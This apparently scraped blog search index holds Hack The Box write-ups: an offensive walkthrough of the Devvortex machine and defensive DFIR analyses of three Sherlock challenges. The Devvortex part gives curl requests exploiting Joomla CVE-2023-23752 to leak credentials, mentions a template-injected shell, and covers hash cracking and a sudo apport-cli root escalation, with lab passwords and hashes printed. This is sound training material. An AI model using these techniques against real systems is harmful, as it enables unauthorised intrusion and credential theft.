dev.devvortex.htb http enumeration - dev.devvortex.htb ffuf\n$ ffuf -w ~/seclists/discovery/web-content/raft-medium-directories-lowercase.txt:fuzz -u http://dev.devvortex.htb/fuzz /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: method : get :: url : http://dev.devvortex.htb/fuzz :: wordlist : fuzz: /home/neptune/seclists/discovery/web-content/raft-medium-directories-lowercase.txt :: follow redirects : false :: calibration : false :: timeout : 10 :: threads : 40 :: matcher : response status: 200-299,301,302,307,401,403,405,500 ________________________________________________ modules [status: 301, size: 178, words: 6, lines: 8, duration: 75ms] templates [status: 301, size: 178, words: 6, lines: 8, duration: 68ms] tmp [status: 301, size: 178, words: 6, lines: 8, duration: 69ms] media [status: 301, size: 178, words: 6, lines: 8, duration: 69ms] cache [status: 301, size: 178, words: 6, lines: 8, duration: 70ms] images [status: 301, size: 178, words: 6, lines: 8, duration: 70ms] plugins [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] includes [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] language [status: 301, size: 178, words: 6, lines: 8, duration: 71ms] administrator [status: 301, size: 178, words: 6, lines: 8, duration: 91ms] libraries [status: 301, size: 178, words: 6, lines: 8, duration: 91ms] components [status: 301, size: 178, words: 6, lines: 8, duration: 75ms] api [status: 301, size: 178, words: 6, lines: 8, duration: 89ms] home [status: 200, size: 23221, words: 5081, lines: 502, duration: 423ms] layouts [status: 301, size: 178, words: 6, lines: 8, duration: 106ms] [status: 200, size: 23221, words: 5081, lines: 502, duration: 1176ms] cli [status: 301, size: 178, words: 6, lines: 8, duration: 149ms] :: progress: [26584/26584] :: job [1/1] :: 33 req/sec :: duration: [0:12:53] :: errors: 2 :: robots.txt - http://dev.devvortex.htb/robots.txt\n\u0026lt;---snipped---\u0026gt; user-agent: * disallow: /administrator/ disallow: /api/ disallow: /bin/ disallow: /cache/ disallow: /cli/ disallow: /components/ disallow: /includes/ disallow: /installation/ disallow: /language/ disallow: /layouts/ disallow: /libraries/ disallow: /logs/ disallow: /modules/ disallow: /plugins/ disallow: /tmp/ readme.txt\njoomla! cmsâ¢ 1- overview * this is a joomla! 4.x installation/upgrade package. * joomla! official site: https://www.joomla.org * joomla! 4.2 version history - https://docs.joomla.org/special:mylanguage/joomla_4.2_version_history * detailed changes in the changelog: https://github.com/joomla/joomla-cms/commits/4.2-dev \u0026lt;---snipped---\u0026gt; services running\njoomla cms 4.2 vulnerability assessment - joomla cms 4.2 vulnerability: joomla cms 4.2 is vulnerable to unauthenticated information disclosure (cve-2023-23752) due to improper access check in core webservice endpoints. the affected versions are 4.0.0-4.2.7 in range. due to flaws in joomlaâs access control to web service endpoints, unauthenticated attackers access the restapi interface to obtain joomla-related configuration information by constructing specially crafted requests, which eventually leads to the disclosure of sensitive information. for more on the vulnerability :\nns focus global vuln check poc: a publicly available exploit is published on exploitdb. we can use this {root_url}/api/index.php/v1/users?public=true rest endpoint to obtain user information , and this {root_url}/api/index.php/v1/config/application?public=true endpoint for application configuration.\njoomla cms 4.2 exploiting cve-2023-23752 user information:\n$ curl http://dev.devvortex.htb/api/v1/users?public=true {\u0026quot;links\u0026quot;:{\u0026quot;self\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/v1\\/users?public=true\u0026quot;},\u0026quot;data\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;users\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;649\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;id\u0026quot;:649,\u0026quot;name\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;lewis@devvortex.htb\u0026quot;,\u0026quot;block\u0026quot;:0,\u0026quot;sendemail\u0026quot;:1,\u0026quot;registerdate\u0026quot;:\u0026quot;2023-09-25 16:44:24\u0026quot;,\u0026quot;lastvisitdate\u0026quot;:\u0026quot;2024-04-26 10:37:12\u0026quot;,\u0026quot;lastresettime\u0026quot;:null,\u0026quot;resetcount\u0026quot;:0,\u0026quot;group_count\u0026quot;:1,\u0026quot;group_names\u0026quot;:\u0026quot;super users\u0026quot;}},{\u0026quot;type\u0026quot;:\u0026quot;users\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;650\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;id\u0026quot;:650,\u0026quot;name\u0026quot;:\u0026quot;logan paul\u0026quot;,\u0026quot;username\u0026quot;:\u0026quot;logan\u0026quot;,\u0026quot;email\u0026quot;:\u0026quot;logan@devvortex.htb\u0026quot;,\u0026quot;block\u0026quot;:0,\u0026quot;sendemail\u0026quot;:0,\u0026quot;registerdate\u0026quot;:\u0026quot;2023-09-26 19:15:42\u0026quot;,\u0026quot;lastvisitdate\u0026quot;:null,\u0026quot;lastresettime\u0026quot;:null,\u0026quot;resetcount\u0026quot;:0,\u0026quot;group_count\u0026quot;:1,\u0026quot;group_names\u0026quot;:\u0026quot;registered\u0026quot;}}],\u0026quot;meta\u0026quot;:{\u0026quot;total-pages\u0026quot;:1}} application config:\n$ curl http://dev.devvortex.htb/api/index.php/v1/config/application?public=true {\u0026quot;links\u0026quot;:{\u0026quot;self\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026quot;,\u0026quot;next\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=20\u0026amp;page%5blimit%5d=20\u0026quot;,\u0026quot;last\u0026quot;:\u0026quot;http:\\/\\/dev.devvortex.htb\\/api\\/index.php\\/v1\\/config\\/application?public=true\u0026amp;page%5boffset%5d=60\u0026amp;page%5blimit%5d=20\u0026quot;},\u0026quot;data\u0026quot;:[{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline_message\u0026quot;:\u0026quot;this site is down for maintenance.\u0026lt;br\u0026gt;please check back again soon.\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;display_offline_message\u0026quot;:1,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;offline_image\u0026quot;:\u0026quot;\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;sitename\u0026quot;:\u0026quot;development\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;editor\u0026quot;:\u0026quot;tinymce\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;captcha\u0026quot;:\u0026quot;0\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;list_limit\u0026quot;:20,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;access\u0026quot;:1,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug_lang\u0026quot;:false,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;debug_lang_const\u0026quot;:true,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbtype\u0026quot;:\u0026quot;mysqli\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;host\u0026quot;:\u0026quot;localhost\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;user\u0026quot;:\u0026quot;lewis\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;password\u0026quot;:\u0026quot;p4ntherg0t1n5r3c0n##\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;db\u0026quot;:\u0026quot;joomla\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbprefix\u0026quot;:\u0026quot;sd4fg_\u0026quot;,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbencryption\u0026quot;:0,\u0026quot;id\u0026quot;:224}},{\u0026quot;type\u0026quot;:\u0026quot;application\u0026quot;,\u0026quot;id\u0026quot;:\u0026quot;224\u0026quot;,\u0026quot;attributes\u0026quot;:{\u0026quot;dbsslverifyservercert\u0026quot;:false,\u0026quot;id\u0026quot;:224}}],\u0026quot;meta\u0026quot;:{\u0026quot;total-pages\u0026quot;:4}} we can see from the meta that it\u0026rsquo;s only page 1 out of 4. we should gather all the data from this api using the next link and save it to a file.\nusers and credentials users:\nlewis:\n{ \u0026quot;id\u0026quot;: 649, \u0026quot;name\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;lewis@devvortex.htb\u0026quot;, \u0026quot;block\u0026quot;: 0, \u0026quot;sendemail\u0026quot;: 1, \u0026quot;registerdate\u0026quot;: \u0026quot;2023-09-25 16:44:24\u0026quot;, \u0026quot;lastvisitdate\u0026quot;: \u0026quot;2024-04-26 10:37:12\u0026quot;, \u0026quot;lastresettime\u0026quot;: null, \u0026quot;resetcount\u0026quot;: 0, \u0026quot;group_count\u0026quot;: 1, \u0026quot;group_names\u0026quot;: \u0026quot;super users\u0026quot; } logan:\n{ \u0026quot;id\u0026quot;: 650, \u0026quot;name\u0026quot;: \u0026quot;logan paul\u0026quot;, \u0026quot;username\u0026quot;: \u0026quot;logan\u0026quot;, \u0026quot;email\u0026quot;: \u0026quot;logan@devvortex.htb\u0026quot;, \u0026quot;block\u0026quot;: 0, \u0026quot;sendemail\u0026quot;: 0, \u0026quot;registerdate\u0026quot;: \u0026quot;2023-09-26 19:15:42\u0026quot;, \u0026quot;lastvisitdate\u0026quot;: null, \u0026quot;lastresettime\u0026quot;: null, \u0026quot;resetcount\u0026quot;: 0, \u0026quot;group_count\u0026quot;: 1, \u0026quot;group_names\u0026quot;: \u0026quot;registered\u0026quot; } credentials:\nlewis:\n{ \u0026quot;type\u0026quot;: \u0026quot;application\u0026quot;, \u0026quot;id\u0026quot;: \u0026quot;224\u0026quot;, \u0026quot;attributes\u0026quot;: { \u0026quot;user\u0026quot;: \u0026quot;lewis\u0026quot;, \u0026quot;id\u0026quot;: 224 } }, { \u0026quot;type\u0026quot;: \u0026quot;application\u0026quot;, \u0026quot;id\u0026quot;: \u0026quot;224\u0026quot;, \u0026quot;attributes\u0026quot;: { \u0026quot;password\u0026quot;: \u0026quot;p4ntherg0t1n5r3c0n##\u0026quot;, \u0026quot;id\u0026quot;: 224 } }, we can try this creds to log into the admin dashboard of joomla at http://dev.devvortex.htb/administrator.\nadmin dashboard enumeration php: 7.4.3 which is obsolete and no longer receives official security updates. mysql: 8.0.35-0ubuntu0.20.04.1 server: linux devvortex 5.4.0-167-generic #184-ubuntu smp tue oct 31 09:21:49 utc 2023 x86_64 disable php functions: pcntl_alarm pcntl_fork pcntl_waitpid pcntl_wait pcntl_wifexited pcntl_wifstopped pcntl_wifsignaled pcntl_wifcontinued pcntl_wexitstatus pcntl_wtermsig pcntl_wstopsig pcntl_signal pcntl_signal_get_handler pcntl_signal_dispatch pcntl_get_last_error pcntl_strerror pcntl_sigprocmask pcntl_sigwaitinfo pcntl_sigtimedwait pcntl_exec pcntl_getpriority pcntl_setpriority pcntl_async_signals pcntl_unshare phar: php archive support is enabled. can be used to bypass upload restriction for a shell. getting foothold in the system menu joomla offeres option to customize a template. i customized a template by modifying a existing php file. by inserting a shellcode i was successful getting a shell on the box as www-data user.\nprivilege escalation shell stabilization the shell was not stable at all. i couldn\u0026rsquo;t see any interective output because i was missing an actual shell.\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\ni was www-data and it\u0026rsquo;s shell was assigned nologin. i did the following to make the shell stable.\nscript /dev/null -c /bin/bash ctrl + z stty raw -echo; fg then press enter twice, and then enter: export term=xterm then i had a good enough shell to work with.\nuser enumeration after inspecting the /etc/passwd file i was sure that i had to escalate my privileges and take over logan account. i could list the account\u0026rsquo;s home directory and found the user flag but didn\u0026rsquo;t have permission to read it.\nservice enumeration after inspecting for users i tried to access the mysql database to find any credentials that can help me pivot to logan. so i logged in to the database service using the lewis:p4ntherg0t1n5r3c0n## and it worked.\nmysql enumeration databses:\nshow databases; +--------------------+ | database | +--------------------+ | information_schema | | joomla | | performance_schema | +--------------------+ tables:\n+-------------------------------+ | tables_in_joomla | +-------------------------------+ | sd4fg_action_log_config | | sd4fg_action_logs | | sd4fg_action_logs_extensions | | sd4fg_action_logs_users | | sd4fg_assets | | sd4fg_associations | | sd4fg_banner_clients | | sd4fg_banner_tracks | | sd4fg_banners | | sd4fg_categories | | sd4fg_contact_details | | sd4fg_content | | sd4fg_content_frontpage | | sd4fg_content_rating | | sd4fg_content_types | | sd4fg_contentitem_tag_map | | sd4fg_extensions | | sd4fg_fields | | sd4fg_fields_categories | | sd4fg_fields_groups | | sd4fg_fields_values | | sd4fg_finder_filters | | sd4fg_finder_links | | sd4fg_finder_links_terms | | sd4fg_finder_logging | | sd4fg_finder_taxonomy | | sd4fg_finder_taxonomy_map | | sd4fg_finder_terms | | sd4fg_finder_terms_common | | sd4fg_finder_tokens | | sd4fg_finder_tokens_aggregate | | sd4fg_finder_types | | sd4fg_history | | sd4fg_languages | | sd4fg_mail_templates | | sd4fg_menu | | sd4fg_menu_types | | sd4fg_messages | | sd4fg_messages_cfg | | sd4fg_modules | | sd4fg_modules_menu | | sd4fg_newsfeeds | | sd4fg_overrider | | sd4fg_postinstall_messages | | sd4fg_privacy_consents | | sd4fg_privacy_requests | | sd4fg_redirect_links | | sd4fg_scheduler_tasks | | sd4fg_schemas | | sd4fg_session | | sd4fg_tags | | sd4fg_template_overrides | | sd4fg_template_styles | | sd4fg_ucm_base | | sd4fg_ucm_content | | sd4fg_update_sites | | sd4fg_update_sites_extensions | | sd4fg_updates | | sd4fg_user_keys | | sd4fg_user_mfa | | sd4fg_user_notes | | sd4fg_user_profiles | | sd4fg_user_usergroup_map | | sd4fg_usergroups | | sd4fg_users | | sd4fg_viewlevels | | sd4fg_webauthn_credentials | | sd4fg_workflow_associations | | sd4fg_workflow_stages | | sd4fg_workflow_transitions | | sd4fg_workflows | +-------------------------------+ users:\n+----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | lewis | $2y$10$6v52x.sd8xc7hnlvwutri.ax4biayuhvbmvvnywrcebmy8xdezm1u | | logan | $2y$10$it4k5kmsgvhso9d6m/1w0eyib5ne9xzarqrfjtgthniy/ybtkij12 | +----------+--------------------------------------------------------------+ cracking the logan hash using john the ripper i was able to crack the hash for logan.\nlogan:tequieromucho\nlet\u0026rsquo;s try this credential to log on. i could successfully log in using ssh.\nroot privilege escalation after login into the logan account. i ran the command sudo -l with the above password. and i found following sudoers privileges for the account.\nmatching defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin user logan may run the following commands on devvortex: (all : all) /usr/bin/apport-cli so logan can run /usr/bin/apport-cli with sudo. after, searching for apport-cli\u0026rsquo;s know vulnerability i found a privilege escalation vulnerability for apport-cli \u0026lt;= v2.26.0 dubbed cve-2023-1326. the machine\u0026rsquo;s apport-cli version is 2.20.11. so it can be exploited if certain conditions are met. for more on the poc.\nsystem should specially configured to allow unprivileged users to run sudo apport-cli.\nless is configured as the pager.\nthe terminal size can be set.\nunfortunately all of the conditions were present in the box and we successfully gained root privilege following the steps described in poc. finally, acquired the root flag.\n","title":"HTB Machine Devvortex"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/noted/","summary":"Noted (DFIR) Scenario Simon, a developer working at Forela, notified the CERT team about a note that appeared on his desktop. The note claimed that his system had been compromised and that sensitive data from Simon\u0026rsquo;s workstation had been collected.","tags":["dfir","file","htb","noted","notepad++","sherlock","time","windows"],"text":"noted (dfir) scenario simon, a developer working at forela, notified the cert team about a note that appeared on his desktop. the note claimed that his system had been compromised and that sensitive data from simon\u0026rsquo;s workstation had been collected. the perpetrators performed data extortion on his workstation and are now threatening to release the data on the dark web unless their demands are met. simon\u0026rsquo;s workstation contained multiple sensitive files, including planned software projects, internal development plans, and application codebases. the threat intelligence team believes that the threat actor made some mistakes, but they have not found any way to contact the threat actors. the company\u0026rsquo;s stakeholders are insisting that this incident be resolved and all sensitive data be recovered. they demand that under no circumstances should the data be leaked. as our junior security analyst, you have been assigned a specific type of dfir (digital forensics and incident response) investigation in this case. the cert lead, after triaging the workstation, has provided you with only the notepad++ artifacts, suspecting that the attacker created the extortion note and conducted other activities with hands-on keyboard access. your duty is to determine how the attack occurred and find a way to contact the threat actors, as they accidentally locked out their own contact information.\nforensics artifacts: the artifacts are from notepad++ software. we have two xml files named config.xml and session.xml. we are also provided with two backup files of two text files lootandpurge.java@2023-07-24_145332 and you have been hacked.txt@2023-07-24_150548.\nextraction: the files were all in plaintext format and the volume of data was low, so extraction was not necessary. however, five files were created for classification purposes. they are file history of recently opened files, edited files in the alleged notepad++, custom uris the alleged notepad++ was set to handle, malicious data extortion java file and a ransom note file\nanalysis:\nfirst, i examined the config.xml file and found some file histories. the history contained the file addresses that were recently opened by the user. i have listed them in the file_history.txt file. also, i found some custom uris that were set to handle files from different types of services. they are listed in the custom_uris.txt file.\nsecond, i analyzed the session.xml file and there i found two files that were being edited along with their backup file locations and last modified timestamps. i added them to a file named edited_files.txt with the findings.\nfinally, i inspected the backup files and discovered a malicious java source file(lootandpurge.java) that was used to encrypt the sensitive data and a ransom note where two pastebin links were given to contact the cybercriminals. a password for the zip file was left behind by the perpetrators. which can be used to decrypt the content of the zip file. the same password can be used to decrypt the pastebin notes to find their ethereum wallet address and email address.\ntools used visual studio code python3 questions and answers q1: what is the full path of the script used by simon for aws operations?\na: c:\\users\\simon.stark\\documents\\dev_ops\\aws_objects migration.pl q2: the attacker duplicated some program code and compiled it on the system, knowing that the victim was a software engineer and had all the necessary utilities. they did this to blend into the environment and didn\u0026rsquo;t bring any of their tools. this code gathered sensitive data and prepared it for exfiltration. what is the full path of the program\u0026rsquo;s source file?\na: c:\\users\\simon.stark\\desktop\\lootandpurge.java. q3: what\u0026rsquo;s the name of the final archive file containing all the data to be exfiltrated?\na: forela-dev-data.zip q4: what\u0026rsquo;s the timestamp in utc when attacker last modified the program source file?\na: 2023-07-24 09:53:23 q5: the attacker wrote a data extortion note after exfiltrating data. what is the crypto wallet address to which attackers demanded payment?\na: 0xca8fa8f0b631ecdb18cda619c4fc9d197c8affca q6: what\u0026rsquo;s the email address of the person to contact for support?\na: cyberjunkie@mail2torjgmxgexntbrmhvgluavhj7ouul5yar6ylbvjkxwqf6ixkwyd.onion summary using the artifacts provided i was able to answer the questions. it was pretty straightforward. but answering question 4 was a little bit baffling to me. it was related to windows\u0026rsquo;s filetime system. i did a little bit of research and piece together an article that you can read here (filetime). also, i added a python script to convert it into utc.\n","title":"HTB Sherlock Noted"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/jingle-bell/","summary":"Jingle Bell (DFIR) Scenario Torrin is suspected to be an insider threat in Forela. He is believed to have leaked some data and removed certain applications from their workstation. They managed to bypass some controls and installed unauthorized software.","tags":["bell","database","dfir","htb","jingle","notification","push","sherlock","windows","wpndatabase"],"text":"jingle bell (dfir) scenario torrin is suspected to be an insider threat in forela. he is believed to have leaked some data and removed certain applications from their workstation. they managed to bypass some controls and installed unauthorized software. despite the forensic team\u0026rsquo;s efforts, no evidence of data leakage was found. as a senior incident responder, you have been tasked with investigating the incident to determine the conversation between the two parties involved.\nforensics we are given a windows push notification database file named wpndatabase.db. we can learn more about this database file on:\na digital forensic view of windows 10 notifications windows push notification (wpn) database parser users guide by tzworksÂ® from reading these articles we discovered that in that db file, there\u0026rsquo;s a table named notification. it contains the information of the notifications shown by windows\u0026rsquo;s notification manager as xml payload.\ntherefore, we used sqlitebrowser and manually dumped the xml data from the notification table. and saved them in the notifications.xml file.\nwe need to analyze this xml file to answer the following questions.\nquestions and answers q: which software/application did torrin use to leak forela\u0026rsquo;s secrets?\na: torrin used slack to leak the secrets. we know this from the notification\u0026rsquo;s \u0026lt;toast launch=\u0026quot;\u0026quot;\u0026gt; section. q: what\u0026rsquo;s the name of the rival company to which torrin leaked the data?\na: the rival company\u0026rsquo;s name is primetech innovations. we got this information from \u0026lt;header title=\u0026quot;\u0026quot;\u0026gt; section of the notification. q: what is the username of the person from the competitor organization whom torrin shared information with?\na: the username is cyberjunkie-primetechdev. we get this answer from \u0026lt;binding\u0026gt;\u0026rsquo;s second \u0026lt;text\u0026gt; tag where the attribute hint-style=\u0026quot;bodysubtle\u0026quot; exists. q: what\u0026rsquo;s the channel name in which they conversed with each other?\na: the channel name is forela-secrets-leak. we can derive this from \u0026lt;binding\u0026gt;\u0026rsquo;s first \u0026lt;text\u0026gt; tag where the attribute hint-maxlines=\u0026quot;1\u0026quot; exists. q: what was the password for the archive server?\na: the password for the archive server is tobdaf8qip$re@1. we get this from reading the body of a notification. q: what was the url provided to torrin to upload stolen data to?\na: the url is https://drive.google.com/drive/folders/1vw97vbmxdzuieueug64g5dlzvfp-pdll?usp=sharing. q: when was the above link shared with torrin?\na: when answering this question we faced some difficulties. two timestamps could be the answer to the question. firstly, the notification table has an arrivaltime timestamp expressed in microsoft filetime 64-bit format. when converted to date it gave gmt thu apr 20 2023 10:36:08. but it wasn\u0026rsquo;t the answer. secondly, there was another timestamp embedded inside the \u0026lt;toast launch=\u0026quot;slack://channel?id=c05451qsqm8\u0026amp;amp;message=1681986889.660179\u0026amp;amp;team=t054518aduj\u0026amp;amp;origin=notification\u0026quot;\u0026gt; tag of the notification\u0026rsquo;s xml structure. the message=1681986889.660179 converts to gmt thu apr 20 2023 10:34:49. turns out the latter one was the correct one. so, the answer is 2023-04-20 10:34:49. q: for how much money did torrin leak forela\u0026rsquo;s secrets?\na: the answer is Â£10000. we could find it in the notifications.xml file. ","title":"HTB Sherlock Jingle Bell"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/htb-sherlocks/bft/","summary":"BFT (DFIR) Scenario In this Sherlock, you will become acquainted with MFT (Master File Table) forensics. You will be introduced to well-known tools and methodologies for analyzing MFT artifacts to identify malicious activity.","tags":["bft","dfir","file","htb","master","mft","sherlock","table","windows"],"text":"bft (dfir) scenario in this sherlock, you will become acquainted with mft (master file table) forensics. you will be introduced to well-known tools and methodologies for analyzing mft artifacts to identify malicious activity. during our analysis, you will utilize the mftecmd tool to parse the provided mft file, timeline explorer to open and analyze the results from the parsed mft, and a hex editor to recover file contents from the mft.\nforensics artifact: an mft file $mft is provided. it\u0026rsquo;s an ntfs file system\u0026rsquo;s master file table. learn more about mft here. extraction: i used mftecmd to extract the contents of it and saved it to a file in csv format. analysis: timeline explorer and 010editor were used to answer the questions. tools used mftecmd by eric zimmerman timeline explorer 010editor hex editor questions and answers q1: simon stark was targeted by attackers on february 13. he downloaded a zip file from a link received in an email. what was the name of the zip file he downloaded from the link?\na: the answer is stage-20240213t093324z-001.zip. i applied a filter on the header created0x10 with the date 2024-02-13 and on the header extension with the value .zip. q2: examine the zone identifier contents for the initially downloaded zip file. this field reveals the hosturl from where the file was downloaded, serving as a valuable indicator of compromise (ioc) in our investigation/analysis. what is the full host url from where this zip file was downloaded?\na: the answer is https://storage.googleapis.com/drive-bulk-export-anonymous/20240213t093324.039z/4133399871716478688/a40aecd0-1cf3-4f88-b55a-e188d5c1c04f/1/c277a8b4-afa9-4d34-b8ca-e1eb5e5f983c?authuser.\nto find the url of the downloaded file i needed to locate the stage-20240213t093324z-001.zip:zone.identifier file by applying a filter on extension with the value .identifier. the zone.identifier file separated by a : after the original file is an alternate data stream (ads) file. it contains the file\u0026rsquo;s origin location. in this case, it was a url. it can be found under the zone id contents header.\nq3: what is the full path and name of the malicious file that executed malicious code and connected to a c2 server?\na: the answer is c:\\users\\simon.stark\\downloads\\stage-20240213t093324z-001\\stage\\invoice\\invoices\\invoice.bat. the file was found by applying a filter on the header parent path with the initial zip file\u0026rsquo;s partial name stage and a suspicious .bat file was discovered. q4: analyze the $created0x30 timestamp for the previously identified file. when was this file created on disk?\na: the answer is 2024-02-13 16:38:39. learn more about the difference between $created0x10 and $created0x30. q5: finding the hex offset of an mft record is beneficial in many investigative scenarios. find the hex offset of the stager file from question 3.\na: the answer is 16e3000. to find the answer i needed to look for the malicious file\u0026rsquo;s entry number which was 23436. then i multiplied it with 1024 23436*1024 because each entry in the mft is 1024 bytes in size. after that, i converted the decimal number to hex. q6: each mft record is 1024 bytes in size. if a file on disk has smaller size than 1024 bytes, they can be stored directly on mft file itself. these are called mft resident files. during windows file system investigation, its crucial to look for any malicious/suspicious files that may be resident in mft. this way we can find contents of malicious files/scripts. find the contents of the malicious stager identified in question3 and answer with the c2 ip and port.\na: the answer is 43.204.110.203:6666.\ni had the hex offset for the invoice.bat file\u0026rsquo;s entry and from the timeline explorer, and i discovered the file size was 286 bytes. so, it can be safely assumed it is an mft resident file. the contents of this file can be viewed using a hex editor.\ni opened up my hex editor went to the offset 16e3000 and found the file\u0026rsquo;s contents. it used powershell to download a payload from the above ip.\nsummary using the mft file i was able to discover a stager file residing in mft and the url which was used to deliver it initially. i also discovered a c2 server by reading the contents of that file. a timeline for this incident was also established using timeline explorer.\n","title":"HTB Sherlock BFT"},{"date":"2024-05-16","image":"","imageAlt":"","link":"https://hshakilst.github.io/posts/filetime/","summary":"FILETIME in Windows What is FILETIME? A file time is a 64-bit value that represents the number of 100-nanosecond intervals that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).","tags":["dfir","file","time","timestamp","windows"],"text":"filetime in windows what is filetime? a file time is a 64-bit value that represents the number of 100-nanosecond intervals that have elapsed since 12:00 a.m. january 1, 1601 coordinated universal time (utc). the system records file times when applications create, access, and write to files.\nthe ntfs file system stores time values in utc format, so they are not affected by changes in time zone or daylight saving time. the fat file system stores time values based on the local time of the computer.\ntime stamps are updated at various times and for various reasons. the only guarantee about a file time stamp is that the file time is correctly reflected when the handle that makes the change is closed.\nnot all file systems can record creation and last access times, and not all file systems record them in the same manner. for example, the resolution of create time on fat is 10 milliseconds, while write time has a resolution of 2 seconds and access time has a resolution of 1 day, so it is really the access date. the ntfs file system delays updates to the last access time for a file by up to 1 hour after the last access.\nfiletime structure (minwinbase.h) 